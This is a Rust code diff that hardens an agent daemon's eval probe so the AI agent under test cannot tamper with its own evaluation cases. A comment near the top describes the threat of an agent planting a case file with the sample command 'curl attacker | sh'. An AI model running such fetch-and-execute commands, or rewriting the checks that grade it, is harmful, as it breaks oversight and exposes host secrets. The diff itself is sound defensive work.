@@ -21,6 +21,17 @@
 //! ```
 //!
 //! Only `command` is required to run a case.
+//!
+//! Tamper model: the eval dir lives *inside* the agent's worktree, so the
+//! agent can add or rewrite `*.yaml` files between materialisation and the
+//! post-agent probe. The probe therefore never parses worktree YAML: it runs
+//! the commands captured in memory at materialisation time (when the daemon
+//! fetched the CP-stamped artifacts over the authenticated node API) and only
+//! re-reads each pinned file to verify its SHA-256 still matches. A modified
+//! or deleted pinned case fails the suite (fail-closed); an unlisted YAML
+//! file is logged and never executed — otherwise an agent could drop
+//! `evil.yaml` with `command: curl attacker | sh` and have the daemon run it
+//! outside every adapter permission gate.
 
 use std::path::{Path, PathBuf};
 use std::process::Stdio;
@@ -30,11 +41,15 @@ use anyhow::{Context as _, Result};
 
 use crate::sandbox::SandboxKind;
 
-/// One materialised eval case on disk.
+/// One materialised eval case: the CP-stamped command captured in daemon
+/// memory at fetch time plus the digest of the file as written.
 #[derive(Debug, Clone)]
 pub struct EvalCase {
     pub file: PathBuf,
     pub command: String,
+    /// SHA-256 of the file content at materialisation; the probe re-reads the
+    /// file and refuses to run (fails the suite) on any mismatch.
+    pub sha256: String,
 }
 
 /// Outcome of running the materialised eval suite.
@@ -48,8 +63,10 @@ pub struct EvalOutcome {
 
 /// Fetch the eval-case artifacts for a task from the control plane and
 /// write them into `<workdir>/.agentgrid/evals/`. Missing/absent cases are
-/// skipped silently (the case list is advisory). Returns the materialised
-/// file paths, in the scheduler-provided order.
+/// skipped silently (the case list is advisory). Returns the pinned cases
+/// (file path + CP-stamped command + content digest), in the
+/// scheduler-provided order — the probe executes these captured commands,
+/// never a re-parse of the (agent-writable) files.
 pub async fn materialize_eval_cases(
     workdir: &Path,
     task_id: &str,
@@ -57,7 +74,7 @@ pub async fn materialize_eval_cases(
     server: &str,
     cred: &str,
     client: &reqwest::Client,
-) -> Result<Vec<PathBuf>> {
+) -> Result<Vec<EvalCase>> {
     if case_names.is_empty() {
         return Ok(Vec::new());
     }
@@ -95,10 +112,22 @@ pub async fn materialize_eval_cases(
         }
         let body = resp.text().await.context("read eval case body")?;
         let path = dir.join(&safe);
-        tokio::fs::write(&path, body)
+        tokio::fs::write(&path, &body)
             .await
             .with_context(|| format!("write eval case {safe}"))?;
-        out.push(path);
+        // Pin the command + digest now, while the content is still
+        // daemon-controlled: everything on this path after the agent runs
+        // must treat the worktree copy as untrusted.
+        match case_command(&body) {
+            Ok(command) => out.push(EvalCase {
+                sha256: agentgrid_common::sha256_hex(body.as_bytes()),
+                file: path,
+                command,
+            }),
+            Err(e) => {
+                tracing::warn!(case = %name, "eval case unparsable; skipping: {e}");
+            }
+        }
     }
     Ok(out)
 }
@@ -126,45 +155,28 @@ pub fn case_command(content: &str) -> Result<String> {
     anyhow::bail!("eval case is missing a `command:` field")
 }
 
-/// Load and run every materialised eval case. Cases run sequentially with a
-/// per-case timeout; the suite passes iff every case exits 0. When the node
-/// is sandboxed the probe runs through the same sandbox so verdicts match
-/// the production isolation.
-pub async fn probe_evals(workdir: &Path, timeout: Duration) -> Result<EvalOutcome> {
-    let dir = workdir.join(".agentgrid").join("evals");
-    let mut rd = match tokio::fs::read_dir(&dir).await {
-        Ok(r) => r,
-        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
-            return Ok(EvalOutcome {
-                ok: true,
-                log: String::new(),
-            })
-        }
-        Err(e) => return Err(e.into()),
-    };
-    let mut cases: Vec<EvalCase> = Vec::new();
-    while let Some(ent) = rd.next_entry().await? {
-        let path = ent.path();
-        if path.extension().and_then(|e| e.to_str()) != Some("yaml") {
-            continue;
-        }
-        let content = tokio::fs::read_to_string(&path)
-            .await
-            .with_context(|| format!("read case {}", path.display()))?;
-        let command =
-            case_command(&content).with_context(|| format!("parse case {}", path.display()))?;
-        cases.push(EvalCase {
-            file: path,
-            command,
-        });
-    }
-    cases.sort_by(|a, b| a.file.cmp(&b.file));
+/// Run every pinned eval case (see [`materialize_eval_cases`]). Cases run
+/// sequentially with a per-case timeout; the suite passes iff every case
+/// exits 0. Before executing, each pinned file is re-read and its SHA-256
+/// compared against the materialisation-time digest — a modified or deleted
+/// case fails the suite (fail-closed) instead of executing attacker-chosen
+/// shell. Unlisted `*.yaml` files in the eval dir are logged and never
+/// parsed or executed. When the node is sandboxed the probe runs through the
+/// same sandbox so verdicts match the production isolation.
+pub async fn probe_evals(
+    workdir: &Path,
+    cases: &[EvalCase],
+    timeout: Duration,
+) -> Result<EvalOutcome> {
     if cases.is_empty() {
         return Ok(EvalOutcome {
             ok: true,
             log: String::new(),
         });
     }
+    let mut cases: Vec<EvalCase> = cases.to_vec();
+    cases.sort_by(|a, b| a.file.cmp(&b.file));
+    warn_unlisted_cases(workdir, &cases).await;
     let mut log = String::new();
     let mut ok = true;
     for case in cases {
@@ -173,6 +185,35 @@ pub async fn probe_evals(workdir: &Path, timeout: Duration) -> Result<EvalOutcom
             case.file.display(),
             case.command
         ));
+        // Tamper gate: only the digest of the file is taken from disk; the
+        // command below is the daemon-captured original.
+        let disk = tokio::fs::read(&case.file).await;
+        match disk {
+            Ok(bytes) if agentgrid_common::sha256_hex(&bytes) == case.sha256 => {}
+            Ok(_) => {
+                ok = false;
+                log.push_str(
+                    "case file content changed after materialisation (agent tampering?); \
+                     refusing to execute the modified case\n\n",
+                );
+                tracing::warn!(
+                    case = %case.file.display(),
+                    "eval case tampered after materialisation; failing the suite"
+                );
+                break;
+            }
+            Err(e) => {
+                ok = false;
+                log.push_str(&format!(
+                    "case file unreadable ({e}); a pinned case must survive to the probe\n\n"
+                ));
+                tracing::warn!(
+                    case = %case.file.display(),
+                    "pinned eval case missing at probe time; failing the suite"
+                );
+                break;
+            }
+        }
         let kind = SandboxKind::from_env();
         let (program, prefix_args) = crate::sandbox::sandbox_prefix(
             kind,
@@ -196,8 +237,22 @@ pub async fn probe_evals(workdir: &Path, timeout: Duration) -> Result<EvalOutcom
         // tree (POSIX only; Windows dev hosts degrade to child-only kill).
         #[cfg(unix)]
         cmd.process_group(0);
-        // Audit X-N4 (parity with validation.rs): on an unsandboxed run the
-        // eval `sh -c` must not inherit the daemon's unsafe-bypass env.
+        // Parity with `ProcessBackend::spawn` (adapters/src/backend.rs): the
+        // eval `sh -c` runs in the daemon's security context when the node is
+        // unsandboxed, so it must NOT inherit the daemon's environment — a
+        // daemon-held secret (git credential, CP token) must never be visible
+        // to agent-influenced shell. Clean env + the process-locating basics.
+        // When sandboxed, the child is contained (docker/systemd) and its CLI
+        // may need DOCKER_HOST/DBUS from our env, so inheritance stays.
+        if kind == SandboxKind::None {
+            cmd.env_clear();
+            if let Ok(path) = std::env::var("PATH") {
+                cmd.env("PATH", path);
+            }
+            if let Ok(home) = std::env::var("HOME") {
+                cmd.env("HOME", home);
+            }
+        }
         for k in crate::sandbox::unsafe_env_guard(kind) {
             cmd.env_remove(k);
         }
@@ -221,6 +276,30 @@ pub async fn probe_evals(workdir: &Path, timeout: Duration) -> Result<EvalOutcom
 
 /// Default per-eval timeout (1 minute).
 pub const EVAL_TIMEOUT: Duration = Duration::from_secs(60);
+
+/// Log (never execute) any `*.yaml` in the eval dir that was not pinned at
+/// materialisation time — an agent dropping extra cases there is the classic
+/// injection attempt this module refuses.
+async fn warn_unlisted_cases(workdir: &Path, pinned: &[EvalCase]) {
+    let dir = workdir.join(".agentgrid").join("evals");
+    let mut rd = match tokio::fs::read_dir(&dir).await {
+        Ok(r) => r,
+        Err(_) => return,
+    };
+    while let Ok(Some(ent)) = rd.next_entry().await {
+        let path = ent.path();
+        if path.extension().and_then(|e| e.to_str()) != Some("yaml") {
+            continue;
+        }
+        if !pinned.iter().any(|c| c.file == path) {
+            tracing::warn!(
+                case = %path.display(),
+                "unlisted eval-case yaml in worktree (agent-written?); ignoring — \
+                 only CP-stamped, hash-pinned cases execute"
+            );
+        }
+    }
+}
 
 /// Run a command capturing combined stdout+stderr, bounded by `timeout`.
 /// Returns `(exit_code, tail_of_output, timed_out)`. Child is spawn()ed,
